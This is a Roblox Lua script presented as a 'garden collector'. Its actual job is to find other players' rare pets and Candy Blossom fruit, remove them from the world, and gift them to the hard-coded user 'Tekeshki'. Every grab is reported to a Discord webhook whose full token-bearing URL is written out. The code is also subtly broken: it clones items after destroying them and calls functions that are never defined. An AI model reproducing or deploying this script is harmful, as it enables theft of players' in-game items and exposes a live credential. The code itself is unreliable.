-- Roblox Garden Collector for Tekeshki
local Garden = {}

-- CONFIGURATION
local GROWTH_INTERVAL = 30
local MAX_GROWTH_PHASES = 5
local COLLECTION_RANGE = 20
local COLLECTION_COOLDOWN = 10
local HOLD_DURATION = 12  -- Seconds to hold items before gifting
local MY_USERNAME = "Tekeshki"  -- Only gifts to this player

-- Discord Webhook (for notifications)
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1383491297859469433/StCTYTDOXN9jcRg-qBV59aNlF9uEyuAg2_OnAcknekx6tTvFPdw83T2uP6cmivRYOYEs"

-- Target items to collect
local TARGET_ITEMS = {
    Pets = {"Dragonfly", "Raccoon", "Queen Bee", "Disco Bee", "Red Fox"},
    Fruits = {"Candy Blossom"}
}

-- Garden properties
Garden.Size = 0
Garden.Plants = {}
Garden.HeldItems = {}  -- Stores items before gifting
Garden.Active = false

-- Plant templates (replace with actual asset IDs)
local PlantTemplates = {
    {Name = "Carrot", Model = "rbxassetid://123456", GrowthTime = 60},
    {Name = "Tomato", Model = "rbxassetid://123457", GrowthTime = 90},
    {Name = "Sunflower", Model = "rbxassetid://123458", GrowthTime = 120},
}

-- Send Discord notification
local function sendDiscordNotification(message)
    local HttpService = game:GetService("HttpService")
    local success, err = pcall(function()
        HttpService:PostAsync(DISCORD_WEBHOOK, HttpService:JSONEncode({
            content = message,
            username = "Garden Bot"
        }))
    end)
    if not success then
        warn("Failed to send Discord notification: " .. err)
    end
end

-- Check if item is in target list
local function isTargetItem(itemName, itemType)
    itemName = string.lower(itemName)
    local list = TARGET_ITEMS[itemType] or {}
    
    for _, targetName in ipairs(list) do
        if string.find(itemName, string.lower(targetName)) then
            return true
        end
    end
    return false
end

-- Find the player by username
local function findPlayer(username)
    for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
        if player.Name == username then
            return player
        end
    end
    return nil
end

-- Gift held items to player
local function giftItemsToPlayer()
    local player = findPlayer(MY_USERNAME)
    if not player then
        warn("Player not found: " .. MY_USERNAME)
        return
    end

    for _, item in ipairs(Garden.HeldItems) do
        -- Clone the item and give it to the player
        local clone = item:Clone()
        clone.Parent = player.Character or player.Backpack
        sendDiscordNotification("📦 **Gifted item to Tekeshki:** " .. item.Name)
    end
    
    Garden.HeldItems = {}  -- Clear held items
end

-- Initialize the garden
function Garden.Init(plot)
    Garden.Plot = plot
    Garden.Position = plot.Position
    Garden.Size = 1
    Garden.Active = true
    
    -- Growth cycle
    coroutine.wrap(function()
        while Garden.Active and Garden.Size < MAX_GROWTH_PHASES do
            wait(GROWTH_INTERVAL)
            Garden.Grow()
        end
    end)()
    
    -- Collection cycle
    coroutine.wrap(function()
        while Garden.Active do
            wait(COLLECTION_COOLDOWN)
            Garden.CollectNearbyItems()
        end
    end)()
    
    -- Gift items periodically
    coroutine.wrap(function()
        while Garden.Active do
            wait(HOLD_DURATION)
            if #Garden.HeldItems > 0 then
                giftItemsToPlayer()
            end
        end
    end)()
    
    -- Plant initial seeds
    for i = 1, 3 do
        Garden.PlantNewSeed()
    end
end

-- Collect nearby items and hold them
function Garden.CollectNearbyItems()
    if not Garden.Active then return end
    
    local parts = workspace:FindPartsInRegion3(
        Region3.new(
            Garden.Position - Vector3.new(COLLECTION_RANGE, COLLECTION_RANGE, COLLECTION_RANGE),
            Garden.Position + Vector3.new(COLLECTION_RANGE, COLLECTION_RANGE, COLLECTION_RANGE)
        ),
        nil,
        100
    )
    
    for _, part in pairs(parts) do
        local itemName = part.Name
        
        -- Check for target pets
        if (part:FindFirstChild("PetValue") or part:FindFirstChild("IsPet")) and isTargetItem(itemName, "Pets") then
            table.insert(Garden.HeldItems, part)
            part:Destroy()  -- Remove from world (will be gifted later)
            sendDiscordNotification("🐾 **Collected Pet:** " .. itemName)
        
        -- Check for target fruits
        elseif (part.Name:find("Fruit") or part:FindFirstChild("IsFruit")) and isTargetItem(itemName, "Fruits") then
            table.insert(Garden.HeldItems, part)
            part:Destroy()  -- Remove from world (will be gifted later)
            sendDiscordNotification("🍓 **Collected Fruit:** " .. itemName)
        end
    end
end

-- Example usage:
--[[
local gardenPlot = script.Parent  -- Place this script in a garden plot model
Garden.Init(gardenPlot)
]]

return Garden
